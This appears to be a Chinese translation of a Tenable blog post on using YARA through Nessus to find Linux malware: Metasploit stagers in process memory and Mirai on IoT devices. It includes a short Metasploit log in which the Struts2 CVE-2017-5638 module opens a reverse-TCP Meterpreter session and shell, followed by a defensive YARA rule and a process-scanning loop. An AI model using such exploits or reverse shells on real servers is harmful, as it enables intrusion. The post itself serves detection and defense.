用YARA找到Linux恶意软件

Jarry • 2017年4月11日 • 终端安全 • 阅读 713

Tenable最近发布了两款新的YARA插件。新的插件是YARA内存扫描（Linux）和YARA文件扫描（Linux）（Solaris）。该插件将使YARA能在Linux和Solaris主机上工作。这篇文章描述了Yara的几个应用场景。

内存扫描

关于最近的Struts 2远程代码执行漏洞CVE-2017-5638，有很多讨论。作为回应，我们发布了一篇博客，介绍如何使用Nessus来检测漏洞。

应该采取多种方法来确定上面描述的易受攻击的服务器是否已被利用。一些现有的Nessus插件可以帮助您。例如，Linux MD5扫描仪（插件71261和91223）和Linux进程插件（71261）。另一种方法是使用YARA扫描系统中的恶意文件或进程。例如，如果攻击者使用Metasploit的CVE-2017-5638模块在服务器上执行payload呢？

msf exploit(struts2_content_type_ognl) > run

[*] Started reverse TCP handler on 52.93.5.12:4444
[*] Sending stage (2849752 bytes) to 128.183.27.101
[*] Meterpreter session 5 opened (52.93.5.12:4444 -> 128.183.27.101:45862) at 2017-03-24 07:40:53 -0400

meterpreter > shell
Process 10727 created.
Channel 1 created.
whoami
albinolobster

文件扫描在这里不够完美，因为payload在执行后不久从磁盘中删除。您将需要扫描系统正在运行的进程。但首先，您需要一个YARA规则来描述内存中的有效内容。

该YaraRules项目有很多规则，但我无法找到一个适用Metasploit工具的。所以，我写了自己的规则，并将其添加到Tenable的开源YARA规则库中。该规则使得观察结果是由一个单独的LOAD段组成，读取，写入和执行标志全部设置：

import "elf"

rule single_load_rwe
{
     meta:
          description = "Flags binaries with a single LOAD segment marked as RWE.
          family = "Stager"
          filetype = "ELF"
          hash = "711a06265c71a7157ef1732c56e02a992e56e9d9383ca0f6d98cd96a30e37299"

     condition:
          elf.number_of_segments == 1 and
          elf.segments[0].type == elf.PT_LOAD and
          elf.segments[0].flags == elf.PF_R | elf.PF_W | elf.PF_X
}

然后，您可以使用以下命令扫描所有正在运行的进程（请注意：YARA 3.5及更低版本中存在对Linux内存扫描会提示错误](https://github.com/VirusTotal/yara/pull/622)。请勿用这些版本使用内存扫描）：

albinolobster@ubuntu:~$ for pid in `ps -ef | awk '{print $2}'` ; do sudo yara ./rule_file.yar $pid 2> /dev/null; done
single_load_rwe 10716
single_load_rwe 10718
albinolobster@ubuntu:~$

从输出中可以看出，规则匹配了两个进程：10716和10718.进程可以在以下位置找到ps：

10601 pts/18   Sl+   14:25  |   |   \_ /usr/lib/jvm/java-8-openjdk- …
10716 pts/18   S+     0:20  |   |       \_ /tmp/konL6821804046402511623.exe
29565 pts/18   S+     0:00  |   |       |   \_ /bin/sh -c /bin/sh
29566 pts/18   S+     0:00  |   |       |       \_ /bin/sh
10718 pts/18   S+     0:00  |   |       \_ /tmp/konL6369286348563749691.exe

虽然这个看起来很厉害的，但在每个服务器上手动运行YARA不是一个较好的解决方案。使用YARA通过Nessus使扫描更容易。配置Nessus进行扫描并没有什么变化，在以前的YARA博客有介绍（使用YARA和Nessus进行威胁检测以及安全中心的GRIZZLY STEPPE检测）。

文件扫描

在2016年9月，Mirai僵尸网络成为臭名昭着的最大的分布式拒绝服务（DDoS）在当时的KrebsOnSecurity。后来被用于对Dyn进行的DDoS攻击，导致互联网的大规模中断。

Mirai有趣的地方在于，它技术上不复杂。在发生攻击时，通过使用默认的SSH或Telnet凭据登录到IoT设备和路由器。然而，没有人想出一个解决方案来登录受影响的设备并扫描Mirai。这主要是由于物联网和路由器生态系统的多样性。给定的设备可能正在运行Linux的一个分支版本，或者它也可能运行一个专有的操作系统。该架构可以是MIPS，PowerPC，ARM或其他完全。CPU可能是big-endian，也可能是little-endian。

例如，我的LAN上有一个Ubiquiti SOHO路由器。路由器具有MIPS（big-endian）处理器，运行“Linux AirRouter”作为操作系统，并通过BusyBox提供大量的shell功能。在此设备上没有简单的方法来获取YARA。没有package repository。没有Python 没有编译器 您需要在其他地方编译MIAR版本的YARA，并将其复制到盒子上。

但是，我们在这些插件中为您完成了所有工作。使用Nessus，我可以在我的Ubiquiti路由器上运行YARA，只需将其添加到目标列表中即可。为Mirai使用Florian Roth的（@ cyb3rops）规则我可以找到设备的文件系统上的恶意软件：

结论

Linux，尤其是IoT设备，传统上并不是一个容易找到恶意软件的空间。有了这些新的插件，Tenable希望能够进一步了解您的主机，并能够在任何可能隐藏的地方狩猎恶意软件。
